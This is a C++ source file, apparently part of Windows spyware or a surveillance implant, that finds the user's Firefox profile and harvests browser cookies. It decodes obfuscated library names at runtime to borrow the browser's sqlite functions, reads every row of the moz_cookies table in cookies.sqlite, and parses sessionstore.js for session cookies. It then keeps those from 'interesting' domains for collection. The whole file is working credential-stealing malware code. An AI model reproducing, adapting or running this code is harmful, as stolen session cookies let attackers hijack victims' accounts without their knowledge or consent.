#include <windows.h>
#define _CRT_SECURE_NO_WARNINGS 1
#include <stdio.h>
#include "..\JSON\JSON.h"
#include "..\JSON\JSONValue.h"
#include "..\\common.h"
#include "CookieHandler.h"

// SQLITE Library functions 
typedef int (*sqlite3_open)(const char *, void **);
typedef int (*sqlite3_close)(void *);
typedef int (*sqlite3_exec)(void *, const char *, int (*callback)(void*,int,char**,char**), void *, char **);
static sqlite3_open		social_SQLITE_open = NULL;
static sqlite3_close	social_SQLITE_close = NULL;
static sqlite3_exec		social_SQLITE_exec = NULL;
static HMODULE libsqlsc;
//--------------------

extern int DirectoryExists(WCHAR *path);
extern char *HM_CompletePath(char *file_name, char *buffer);
extern char *GetDosAsciiName(WCHAR *orig_path);
extern WCHAR *GetFFProfilePath();
extern char *DeobStringA(char *string);
extern void FireFoxInitFunc();

#define SQLITEALT_LIBRARY_NAME  "05O9ByZLIn.Xyy" //"mozsqlite3.dll"
#define SQLITE_LIBRARY_NAME  "9ByZLIn.Xyy" //"sqlite3.dll"

int static InitSocialLibs()
{
	FireFoxInitFunc();
	if (!(libsqlsc = GetModuleHandleA(DeobStringA(SQLITE_LIBRARY_NAME)))) 
		if (!(libsqlsc = GetModuleHandleA(DeobStringA(SQLITEALT_LIBRARY_NAME))))
			return 0;
	
	// sqlite functions
	social_SQLITE_open = (sqlite3_open) GetProcAddress(libsqlsc, "sqlite3_open");
	social_SQLITE_close = (sqlite3_close) GetProcAddress(libsqlsc, "sqlite3_close");
	social_SQLITE_exec = (sqlite3_exec) GetProcAddress(libsqlsc, "sqlite3_exec");

	if (!social_SQLITE_open || !social_SQLITE_close || !social_SQLITE_exec) 
		return 0;
	
	return 1;
}


int static parse_sqlite_cookies(void *NotUsed, int argc, char **argv, char **azColName)
{
	char *host = NULL;
	char *name = NULL;
	char *value = NULL;

	for(int i=0; i<argc; i++){
		if(!host && !_stricmp(azColName[i], "host"))
			host = _strdup(argv[i]);
		if(!name && !_stricmp(azColName[i], "name"))
			name = _strdup(argv[i]);
		if(!value && !_stricmp(azColName[i], "value"))
			value = _strdup(argv[i]);
	}	

	NormalizeDomainA(host);
	if (host && name && value && IsInterestingDomainA(host))
		AddCookieA(host, name, value);

	SAFE_FREE(host);
	SAFE_FREE(name);
	SAFE_FREE(value);

	return 0;
}

int static DumpSqliteCookies(WCHAR *profilePath, WCHAR *signonFile)
{
	void *db;
	char *ascii_path;
	CHAR sqlPath[MAX_PATH];
	int rc;

	if (social_SQLITE_open == NULL)
		return 0;

	if (!(ascii_path = GetDosAsciiName(profilePath)))
		return 0;

	sprintf_s(sqlPath, MAX_PATH, "%s\\%S", ascii_path, signonFile);
	SAFE_FREE(ascii_path);

	if ((rc = social_SQLITE_open(sqlPath, &db))) 
		return 0;

	social_SQLITE_exec(db, "SELECT * FROM moz_cookies;", parse_sqlite_cookies, NULL, NULL);

	social_SQLITE_close(db);

	return 1;
}

int DumpSessionCookies(WCHAR *profilePath)
{
	char *session_memory = NULL;
	DWORD session_size;
	HANDLE h_session_file;
	JSONValue *value;
	JSONObject root;
	WCHAR sessionPath[MAX_PATH];
	WCHAR *host = NULL, *name = NULL, *cvalue = NULL;
	DWORD n_read = 0;

	swprintf_s(sessionPath, MAX_PATH, L"%s\\sessionstore.js", profilePath);
	h_session_file = FNC(CreateFileW)(sessionPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (h_session_file == INVALID_HANDLE_VALUE)
		return 0;
	session_size = GetFileSize(h_session_file, NULL);
	if (session_size == INVALID_FILE_SIZE || session_size == 0) {
		CloseHandle(h_session_file);
		return 0;
	}
	session_memory = (char *)malloc(session_size + sizeof(WCHAR));
	if (!session_memory) {
		CloseHandle(h_session_file);
		return 0;
	}
	memset(session_memory, 0, session_size + sizeof(WCHAR));
	if (!ReadFile(h_session_file, session_memory, session_size, &n_read, NULL)) {
		CloseHandle(h_session_file);
		SAFE_FREE(session_memory);
		return 0;
	}
	CloseHandle(h_session_file);
	if (n_read != session_size) {
		SAFE_FREE(session_memory);
		return 0;
	}
	value = JSON::Parse(session_memory);
	if (!value) {
		SAFE_FREE(session_memory);
		return 0;
	}
	if (value->IsObject() == false) {
		delete value;
		SAFE_FREE(session_memory);
		return 0;
	}
	root = value->AsObject();

	if (root.find(L"windows") != root.end() && root[L"windows"]->IsArray()) {
		JSONArray jwindows = root[L"windows"]->AsArray();
		for (unsigned int i = 0; i < jwindows.size(); i++) {
			if (jwindows[i]->IsObject()) {
				JSONObject jtabs = jwindows[i]->AsObject();
				if (jtabs.find(L"cookies") != jtabs.end() && jtabs[L"cookies"]->IsArray()) {
					JSONArray jcookiearray = jtabs[L"cookies"]->AsArray();
					for (unsigned int j = 0; j < jcookiearray.size(); j++) {
						if (jcookiearray[j]->IsObject()) {
							JSONObject jcookie = jcookiearray[j]->AsObject();
							if (jcookie.find(L"host") != jcookie.end() && jcookie[L"host"]->IsString()) 
								host = _wcsdup(jcookie[L"host"]->AsString().c_str());
							if (jcookie.find(L"name") != jcookie.end() && jcookie[L"name"]->IsString()) 
								name = _wcsdup(jcookie[L"name"]->AsString().c_str());
							if (jcookie.find(L"value") != jcookie.end() && jcookie[L"value"]->IsString()) 
								cvalue = _wcsdup(jcookie[L"value"]->AsString().c_str());

							NormalizeDomainW(host);
							if (host && name && cvalue && IsInterestingDomainW(host))
								AddCookieW(host, name, cvalue);

							SAFE_FREE(host);
							SAFE_FREE(name);
							SAFE_FREE(cvalue);
						}
					}
				}
			}
		}
	}	
	delete value;
	SAFE_FREE(session_memory);
	return 1;
}

int DumpFFCookies(void)
{
	WCHAR *ProfilePath = NULL; 	//Profile path

	ProfilePath = GetFFProfilePath();

	if (ProfilePath == NULL || !DirectoryExists(ProfilePath)) 
		return 0;
		
	DumpSessionCookies(ProfilePath);

	if (InitSocialLibs()) 
		DumpSqliteCookies(ProfilePath, L"cookies.sqlite"); 

	return 0;
}
